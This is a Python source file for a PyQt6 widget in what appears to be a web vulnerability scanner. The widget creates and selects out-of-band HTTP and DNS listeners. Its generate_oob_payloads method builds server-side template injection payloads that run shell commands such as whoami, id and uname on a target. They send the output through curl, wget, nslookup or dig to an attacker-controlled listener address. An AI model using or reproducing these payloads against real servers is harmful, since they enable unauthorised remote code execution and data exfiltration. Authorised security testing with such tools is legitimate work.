# app/components/listener_integration.py
from PyQt6.QtWidgets import (QWidget, QHBoxLayout, QVBoxLayout, QCheckBox, 
                            QComboBox, QLabel, QPushButton, QMessageBox)
from PyQt6.QtCore import pyqtSignal
from app.core.listener_manager import listener_manager

class ListenerIntegrationWidget(QWidget):
    """Widget for integrating listeners with scanners"""
    
    oob_enabled_changed = pyqtSignal(bool, str)  # enabled, listener_id
    
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setup_ui()
        self.update_listeners()
        
    def setup_ui(self):
        layout = QHBoxLayout(self)
        layout.setContentsMargins(0, 0, 0, 0)
        
        # Enable OOB checkbox
        self.oob_checkbox = QCheckBox("Enable output to listener")
        self.oob_checkbox.setToolTip("Enable out-of-band data capture for suppressed output")
        self.oob_checkbox.toggled.connect(self.on_oob_toggled)
        layout.addWidget(self.oob_checkbox)
        
        # Listener dropdown
        self.listener_combo = QComboBox()
        self.listener_combo.setToolTip("Select active listener for OOB data capture")
        self.listener_combo.setEnabled(False)
        layout.addWidget(self.listener_combo)
        
        # Refresh button
        refresh_btn = QPushButton("↻")
        refresh_btn.setMaximumWidth(30)
        refresh_btn.setToolTip("Refresh listener list")
        refresh_btn.clicked.connect(self.update_listeners)
        layout.addWidget(refresh_btn)
        
        # Quick create listener button
        create_btn = QPushButton("+ Listener")
        create_btn.setToolTip("Quick create HTTP OOB listener")
        create_btn.clicked.connect(self.quick_create_listener)
        layout.addWidget(create_btn)
        
    def on_oob_toggled(self, enabled):
        """Handle OOB checkbox toggle"""
        self.listener_combo.setEnabled(enabled)
        
        if enabled:
            self.update_listeners()
            if self.listener_combo.count() == 0:
                QMessageBox.information(
                    self, "No Listeners", 
                    "No active listeners found. Create a listener first."
                )
                self.oob_checkbox.setChecked(False)
                return
        
        listener_id = self.listener_combo.currentData() if enabled else None
        self.oob_enabled_changed.emit(enabled, listener_id or "")
        
    def update_listeners(self):
        """Update the listener dropdown"""
        self.listener_combo.clear()
        
        active_listeners = listener_manager.get_active_listeners()
        for listener in active_listeners:
            display_text = f"{listener['id']} (Port {listener['port']}, {listener['type']})"
            self.listener_combo.addItem(display_text, listener['id'])
            
        # Enable/disable based on availability
        has_listeners = len(active_listeners) > 0
        if not has_listeners and self.oob_checkbox.isChecked():
            self.oob_checkbox.setChecked(False)
            
    def quick_create_listener(self):
        """Quick create an HTTP OOB listener"""
        try:
            # Find available port starting from 8080
            port = 8080
            while port < 8090:
                try:
                    listener_id = listener_manager.create_listener(port, "http_oob")
                    success = listener_manager.start_listener(listener_id)
                    
                    if success:
                        QMessageBox.information(
                            self, "Listener Created",
                            f"HTTP OOB listener created on port {port}\n"
                            f"Listener ID: {listener_id}"
                        )
                        self.update_listeners()
                        
                        # Auto-select the new listener
                        for i in range(self.listener_combo.count()):
                            if self.listener_combo.itemData(i) == listener_id:
                                self.listener_combo.setCurrentIndex(i)
                                break
                        
                        return
                    else:
                        port += 1
                        continue
                        
                except Exception:
                    port += 1
                    continue
                    
            QMessageBox.warning(
                self, "Failed to Create Listener",
                "Could not find available port for HTTP OOB listener"
            )
            
        except Exception as e:
            QMessageBox.critical(
                self, "Error", 
                f"Failed to create listener: {str(e)}"
            )
            
    def get_selected_listener(self):
        """Get currently selected listener ID"""
        if self.oob_checkbox.isChecked() and self.listener_combo.currentData():
            return self.listener_combo.currentData()
        return None
        
    def is_oob_enabled(self):
        """Check if OOB is enabled"""
        return self.oob_checkbox.isChecked()
        
    def generate_oob_payloads(self, base_url, param_name):
        """Generate OOB payloads for the selected listener"""
        listener_id = self.get_selected_listener()
        if not listener_id:
            return []
            
        # Get listener info
        listeners = listener_manager.get_all_listeners()
        listener = next((l for l in listeners if l['id'] == listener_id), None)
        if not listener:
            return []
            
        port = listener['port']
        listener_type = listener['type']
        
        # Get local IP (simplified - in real implementation would detect interface)
        local_ip = "YOUR_IP"  # Placeholder
        
        payloads = []
        
        if listener_type == "http_oob":
            payloads.extend([
                f"?{param_name}={{{{ ().__class__.__base__.__subclasses__()[59]('whoami | curl http://{local_ip}:{port}/$(whoami)',shell=True) }}}}",
                f"?{param_name}={{{{ ().__class__.__base__.__subclasses__()[59]('id | wget http://{local_ip}:{port}/$(id)',shell=True) }}}}",
                f"?{param_name}={{{{ ().__class__.__base__.__subclasses__()[59]('curl http://{local_ip}:{port}/$(uname -a | base64)',shell=True) }}}}"
            ])
            
        elif listener_type == "dns_oob":
            payloads.extend([
                f"?{param_name}={{{{ ().__class__.__base__.__subclasses__()[59]('nslookup $(whoami).{local_ip}',shell=True) }}}}",
                f"?{param_name}={{{{ ().__class__.__base__.__subclasses__()[59]('dig $(id | base64).{local_ip}',shell=True) }}}}"
            ])
            
        return payloads